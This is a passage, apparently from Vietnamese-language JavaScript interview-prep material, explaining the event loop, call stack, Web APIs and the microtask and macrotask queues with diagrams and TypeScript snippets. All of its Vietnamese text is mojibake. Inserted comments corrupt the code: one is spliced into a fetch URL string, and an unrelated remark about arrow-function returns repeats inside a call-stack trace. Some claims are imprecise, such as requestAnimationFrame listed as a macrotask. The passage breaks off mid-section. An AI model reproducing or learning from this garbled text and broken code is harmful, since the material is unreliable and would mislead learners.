Promise.resolve().then(() => console.log('3')); // Ch√∫ gi·∫£i: Microtask Queue
console.log('4'); // ƒê·ªìng b·ªô ‚Üí Call Stack

// K·∫øt qu·∫£: 1, 4, 3, 2
// L√Ω do:
// 1. Th·ª±c thi ƒë·ªìng b·ªô: log '1', '4'
// 2. Call Stack tr·ªëng ‚Üí Ki·ªÉm tra Microtask ‚Üí log '3'
// 3. Ki·ªÉm tra Macrotask ‚Üí log '2'
```

**üí° Ki·∫øn Th·ª©c Senior:**
- **Hi·ªáu nƒÉng**: Tr√°nh ch·∫∑n Call Stack v·ªõi t√≠nh to√°n n·∫∑ng ‚Üí d√πng Web Workers ho·∫∑c chia th√†nh chunks v·ªõi `setTimeout`.
- **Debugging**: Hi·ªÉu Event Loop ‚Üí debug l·ªói b·∫•t ƒë·ªìng b·ªô (race conditions, callback hell).
- **React**: `setState` batching d√πng Microtask ‚Üí nhi·ªÅu l·ªùi g·ªçi setState g·ªôp th√†nh 1 l·∫ßn render l·∫°i.
- **Node.js**: `setImmediate()` vs `setTimeout(fn, 0)` ‚Üí `setImmediate` ch·∫°y trong giai ƒëo·∫°n check, nhanh h∆°n trong I/O callbacks.
- **requestAnimationFrame**: Ch·∫°y TR∆Ø·ªöC render (Ch·ªâ tr√¨nh duy·ªát) ‚Üí animation m∆∞·ª£t h∆°n setTimeout.

**üîß K·ªπ Thu·∫≠t T·ªëi ∆Øu:**
- **Chunking (Chia nh·ªè)**: Chia tasks d√†i th√†nh chunks nh·ªè v·ªõi `setTimeout` ‚Üí kh√¥ng ch·∫∑n UI.
- **queueMicrotask()**: Nhanh h∆°n `Promise.resolve().then()` ‚Üí √≠t chi ph√≠ h∆°n.
- **Web Workers**: Offload t√≠nh to√°n n·∫∑ng ‚Üí lu·ªìng ri√™ng (song song th·∫≠t s·ª±).

---

**‚ùì C√¢u H·ªèi:**

Gi·∫£i th√≠ch chi ti·∫øt c∆° ch·∫ø ho·∫°t ƒë·ªông c·ªßa JavaScript Engine v·ªõi Event Loop, Call Stack, Web APIs, Microtask/Macrotask Queues, v√† Single Thread.



**‚úÖ ƒê√°p √Ån Chi Ti·∫øt:**

**üèóÔ∏è KI·∫æN TR√öC T·ªîNG QUAN:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    JAVASCRIPT RUNTIME ENVIRONMENT                    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ              JAVASCRIPT ENGINE (V8, SpiderMonkey)           ‚îÇ    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§    ‚îÇ
‚îÇ  ‚îÇ                                                             ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  üî• CALL STACK (LIFO)                               ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ       ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚îÇ function3() ‚îÇ ‚Üê Top (ƒëang th·ª±c thi)              ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚îÇ function2() ‚îÇ                                     ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚îÇ function1() ‚îÇ                                     ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚îÇ   main()    ‚îÇ ‚Üê Bottom                            ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                                     ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ                                                       ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  üì¶ HEAP (Memory Allocation)                         ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îÇ  ‚Ä¢ Objects, Arrays, Functions                        ‚îÇ  ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ  üåê WEB APIs (Browser/Node.js)                            ‚îÇ    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ setTimeout() / setInterval()                            ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ DOM Events (click, scroll, etc.)                        ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ fetch() / XMLHttpRequest                                ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ FileReader / Web Workers                                ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Geolocation / Notification                              ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ IndexedDB / LocalStorage                                ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îÇ                             ‚Üì callbacks                             ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ  ‚ö° MICROTASK QUEUE (High Priority)                        ‚îÇ    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Promise.then() / Promise.catch()                        ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ queueMicrotask()                                        ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ MutationObserver                                        ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ process.nextTick() (Node.js only - highest priority)   ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ  üéØ MACROTASK QUEUE (Task Queue - Low Priority)           ‚îÇ    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ setTimeout() / setInterval()                            ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ setImmediate() (Node.js only)                           ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ I/O operations (fs, network)                            ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ UI rendering (Browser only)                             ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ requestAnimationFrame() (Browser only)                  ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îÇ                                                                      ‚îÇ
‚îÇ                          ‚Üë                                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ  üîÑ EVENT LOOP (Infinite Loop)                             ‚îÇ    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§    ‚îÇ
‚îÇ  ‚îÇ  while (true) {                                            ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ    1. Check Call Stack ‚Üí Execute sync code                ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ    2. Check Microtask Queue ‚Üí Execute ALL                 ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ    3. Render UI (if needed - browser only)                ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ    4. Check Macrotask Queue ‚Üí Execute ONE                 ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ    5. Go back to step 1                                   ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ  }                                                         ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

**üßµ 1. SINGLE THREAD (ƒê∆°n Lu·ªìng)**

**Kh√°i ni·ªám:**
- JavaScript Engine ch·ªâ c√≥ **1 Call Stack** duy nh·∫•t
- Ch·ªâ th·ª±c thi **1 function t·∫°i 1 th·ªùi ƒëi·ªÉm**
- Kh√¥ng th·ªÉ ch·∫°y ƒë·ªìng th·ªùi nhi·ªÅu tasks nh∆∞ multi-threaded languages (Java, C++)

**∆Øu ƒëi·ªÉm:**
- ‚úÖ ƒê∆°n gi·∫£n, kh√¥ng c√≥ race conditions
- ‚úÖ Kh√¥ng c·∫ßn lock/semaphore
- ‚úÖ D·ªÖ debug h∆°n multi-threaded

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ö†Ô∏è Blocking operations (heavy computation) ƒë√≥ng bƒÉng to√†n b·ªô app
- ‚ö†Ô∏è Kh√¥ng t·∫≠n d·ª•ng ƒë∆∞·ª£c multi-core CPUs

---

**üî• 2. CALL STACK**

**Kh√°i ni·ªám:**
- LIFO stack (Last In First Out) ch·ª©a execution contexts
- M·ªói function call ƒë∆∞·ª£c push v√†o stack
- Khi function return, n√≥ ƒë∆∞·ª£c pop ra kh·ªèi stack

**Ho·∫°t ƒë·ªông:**
```typescript
function multiply(a: number, b: number): number {
  return a * b; // Ch√∫ gi·∫£i: ‚ë¢ Pop
}

function square(n: number): number {
  return multiply(n, n); // Ch√∫ gi·∫£i: ‚ë° Push multiply ‚Üí Pop
}

function printSquare(n: number): void {
  const result = square(n); // Ch√∫ gi·∫£i: ‚ë† Push square
  console.log(result);
}

printSquare(5);

 // NgƒÉn x·∫øp g·ªçi (call stack) th·ª±c thi m√£ ƒë·ªìng b·ªô theo nguy√™n t·∫Øc LIFO; t√°c v·ª• d√†i ch·∫∑n UI.
 // Ch√∫ gi·∫£i: ‚Üí main()
 // Ch√∫ gi·∫£i: ‚Üí main() ‚Üí printSquare(5)
 // Ch√∫ gi·∫£i: ‚Üí main() ‚Üí printSquare(5) ‚Üí square(5)
 // Ch√∫ gi·∫£i: ‚Üí main() ‚Üí printSquare(5) ‚Üí square(5) ‚Üí multiply(5, 5)
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
 // Ch√∫ gi·∫£i: ‚Üí [empty]
```

**Stack Overflow:**
```typescript
// ‚ùå Recursive function kh√¥ng c√≥ ƒëi·ªÅu ki·ªán d·ª´ng
function recursiveFunction() {
  recursiveFunction(); // T·∫°o v√¥ h·∫°n stack frames
}

recursiveFunction(); // NgƒÉn x·∫øp g·ªçi (call stack) th·ª±c thi m√£ ƒë·ªìng b·ªô theo nguy√™n t·∫Øc LIFO; t√°c v·ª• d√†i ch·∫∑n UI.
```

---

**üåê 3. WEB APIs**

**Kh√°i ni·ªám:**
- APIs ƒë∆∞·ª£c cung c·∫•p b·ªüi **Browser** (ho·∫∑c Node.js runtime), KH√îNG ph·∫£i JavaScript Engine
- Ch·∫°y **b√™n ngo√†i** Call Stack ‚Üí kh√¥ng block main thread
- Khi ho√†n th√†nh, callbacks ƒë∆∞·ª£c ƒë∆∞a v√†o Queues

**C√°c Web APIs ph·ªï bi·∫øn:**

```typescript
 // Ch√∫ gi·∫£i: A. Timers
setTimeout(() => console.log('Timer done'), 1000);
setInterval(() => console.log('Tick'), 1000);

 // Ch√∫ gi·∫£i: B. DOM Events
document.getElementById('btn').addEventListener('click', () => {
  console.log('Button clicked');
});

 // Ch√∫ gi·∫£i: C. Network Requests
fetch('https: // Ch√∫ gi·∫£i: api.example.com/data')
  .then(response => response.json())
  .then(data => console.log(data));

 // Ch√∫ gi·∫£i: D. File APIs
const reader = new FileReader();
reader.onload = (e) => console.log(e.target.result);
reader.readAsText(file);

 // Ch√∫ gi·∫£i: E. Observers
const observer = new IntersectionObserver((entries) => {
  console.log('Element intersected');
});

 // Ch√∫ gi·∫£i: F. Geolocation
navigator.geolocation.getCurrentPosition(
  (position) => console.log(position.coords),
  (error) => console.error(error)
);
```

---

**‚ö° 4. MICROTASK QUEUE (Job Queue)**

**Kh√°i ni·ªám:**
- H√†ng ƒë·ª£i ch·ª©a **microtasks** (priority cao)
- **X·ª≠ l√Ω T·∫§T C·∫¢** microtasks tr∆∞·ªõc khi chuy·ªÉn sang macrotask
- ∆Øu ti√™n: **process.nextTick()** > **Promise** > **queueMicrotask**

**C√°c Microtasks:**
```typescript
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
Promise.resolve().then(() => console.log('Microtask 1'));

 // Ch√∫ gi·∫£i: 2. queueMicrotask()
queueMicrotask(() => console.log('Microtask 2'));

 // Ch√∫ gi·∫£i: 3. MutationObserver
const observer = new MutationObserver(() => {
  console.log('DOM mutated - Microtask 3');
});

 // Ch√∫ gi·∫£i: 4. process.nextTick() - Node.js only (highest priority)
process.nextTick(() => console.log('NextTick - Microtask 0'));
```

---

**üéØ 5. MACROTASK QUEUE (Task Queue / Callback Queue)**

**Kh√°i ni·ªám:**
- H√†ng ƒë·ª£i ch·ª©a **macrotasks** (priority th·∫•p h∆°n microtask)
- Event Loop ch·ªâ l·∫•y **M·ªòT macrotask** m·ªói l·∫ßn
- Sau m·ªói macrotask, x·ª≠ l√Ω ALL microtasks

**C√°c Macrotasks:**
```typescript
 // `setTimeout`/`setInterval` n·∫±m trong macrotasks; nh·ªõ clear khi kh√¥ng c·∫ßn ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ.
setTimeout(() => console.log('Macrotask 1'), 0);
setInterval(() => console.log('Macrotask 2'), 1000);

 // Ch√∫ gi·∫£i: 2. setImmediate - Node.js only
setImmediate(() => console.log('Macrotask 3'));

 // Ch√∫ gi·∫£i: 3. I/O operations
fs.readFile('file.txt', (err, data) => {
  console.log('File read - Macrotask 4');
});

 // Ch√∫ gi·∫£i: 4. UI rendering events (Browser)
requestAnimationFrame(() => console.log('RAF - Macrotask 5'));
```

---

**üîÑ 6. EVENT LOOP - QUY TR√åNH HO·∫†T ƒê·ªòNG**

**Thu·∫≠t to√°n Event Loop:**

```
